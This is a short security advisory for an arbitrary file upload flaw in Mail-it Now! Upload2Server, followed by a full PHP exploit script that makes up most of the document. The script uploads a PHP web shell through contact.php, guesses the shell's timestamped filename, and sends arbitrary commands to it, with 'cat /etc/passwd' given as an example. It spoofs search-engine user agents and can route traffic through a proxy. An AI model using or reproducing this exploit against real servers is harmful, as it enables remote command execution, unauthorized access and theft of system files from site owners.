source: http://www.securityfocus.com/bid/14821/info

Mail-it Now! Upload2Server is prone to an arbitrary file upload vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before uploading files.

Successful exploitation will cause the application to execute the file in the security context of the Web server process. This may facilitate unauthorized access; other attacks are also possible.

<?php
/* Mail-it Now! remote code execution
   by rgod
   site: http://rgod.altervista.org
 
   make these changes in php.ini if you have troubles
   with this script:
   allow_call_time_pass_reference = on
   register_globals = on						       */
 
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);
 
echo '<head><title>Mail-it Now! remote commands execution</title>
      <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1
 
>>
 
      <style type="text/css">
      <!--
      body,td,th {color: #00FF00;}
      body {background-color: #000000;}
      .Stile5 {font-family: Verdana, Arial, Helvetica, sans-serif;
font-size: 10px; }
      .Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif;
	       font-weight: bold;
	       font-style: italic;
              }
      -->
      </style></head>
      <body>
      <p class="Stile6">Mail-it Now! (possibly prior versions) remote
commands execution</p>
      <p class="Stile6">a script by rgod at <a href="http://rgod.altervista
org" target="_blank">http://rgod.altervista.org</a></p>
      <table width="84%" >
      <tr>
      <td width="43%">
      <form name="form1" method="post" action="'.$SERVER[PHP_SELF].
?path=value&host=value&port=value&command=value&proxy=value&uploaddir=value
 
>>
 
      <p>
       <input type="text" name="host">
      <span class="Stile5">hostname (ex: www.sitename.com) </span></p>
      <p>
        <input type="text" name="path">
        <span class="Stile5">path (ex: /mailitnow/ or just /) </span></p>

      <p>
      <input type="text" name="uploaddir">
        <span class="Stile5">upload directory (usually  upload/ )
</span></p>
      <p>
      <input type="text" name="port" >
        <span class="Stile5">specify a port other than 80 (default value)
</span></p>
      <p>
      <input type="text" name="command">
        <span class="Stile5">a Unix command, example: ls -la to list
directories, cat /etc/passwd to show passwd file </span></p>
      <p>
      <input type="text" name="proxy">
        <span class="Stile5">send exploit through an HTTP proxy (ip:port) 
</span></p>
      <p>
          <input type="submit" name="Submit" value="go!">
      </p>
    </form></td>
  </tr>
</table>
</body>
</html>';
 
function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }
 
for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
			    }
 
echo "</tr></table>";
}
 
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
 
 
function sendpacket($packet)
{
global $proxy, $host, $port, $html;
if ($proxy=='')
           {$ock=fsockopen(gethostbyname($host),$port);}
             else
           {
	    if (!eregi($proxy_regex,$proxy))
	    {echo htmlentities($proxy).' -> not a valid proxy...';
	     die;
	    }
	   $parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {
 
    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a)
$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}
 
 
if (($path<>'') and ($host<>'') and ($command<>''))
{
 
if ($port=='') {$port=80;}
 
# step 1 -> upload an attachment
 
//we have an error in "From" field so no mail will be sent
//however the attachment will be uploaded  :) 
$data='-----------------------------7d53ac1721026e
Content-Disposition: form-data; name="From"
 
jimihendrix@j@imihendrix.jim
-----------------------------7d53ac1721026e
Content-Disposition: form-data; name="Name"
 
jimihendrix
-----------------------------7d53ac1721026e
Content-Disposition: form-data; name="Msg"
 
ciao
-----------------------------7d53ac1721026e
Content-Disposition: form-data; name="fileup[]"; filename="C:\cmd.php"
Content-Type: text/plain
 
<?php error_reporting(0); system($HTTP_GET_VARS[command]); ?>
-----------------------------7d53ac1721026e
Content-Disposition: form-data; name="fileup[]"; filename=""
Content-Type: application/octet-stream
 
 
-----------------------------7d53ac1721026e
Content-Disposition: form-data; name="submit"
 
 Send
-----------------------------7d53ac1721026e--';
 
if ($proxy=='')
{ $packet="POST ".$path."/contact.php HTTP/1.1\r\n";}
else
{ $packet="POST http://".$host.$path."/contact.php HTTP/1.1\r\n";}
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
application/x-shockwave-flash, application/msword, */*\r\n";
$packet.="Referer: http://".$host.$path."/contact.php\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: multipart/form-data;
boundary=---------------------------7d53ac1721026e\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Keep-Alive\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
show($packet);
$mytime=time(); //I do my best to guess filename, contact.php determine it
in this way:  [time() function result][-][filename you choose]
sendpacket($packet);
 
 
# step 2 -> launch commands...
echo 'if contact.php is vulnerable, now you will see '
htmlentities($command).' output <br>';
for ($i=0; $i<=3; $i++) //no more of 3 retries...
{
if ($proxy=='')
{$packet="GET ".$path.$uploaddir.strval($mytime+$i)."-cmd.php?command="
urlencode($command)." HTTP/1.1\r\n";}
else
{$packet="GET http://".$host.$path.$uploaddir.strval($mytime+$i)."-cmd
php?command=".urlencode($command)." HTTP/1.1\r\n";}
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
application/x-shockwave-flash, application/msword, */*\r\n";
$packet.="Referer: http://".$host."\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: msnbot/1.0 (+http://search.msn.com/msnbot.htm)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Keep-Alive\r\n\r\n";
show($packet);
sendpacket($packet);
if (!eregi('was not found on this server',$html)) {break;} //cycle until you
do not have a NOT FOUND error message
}
}
?>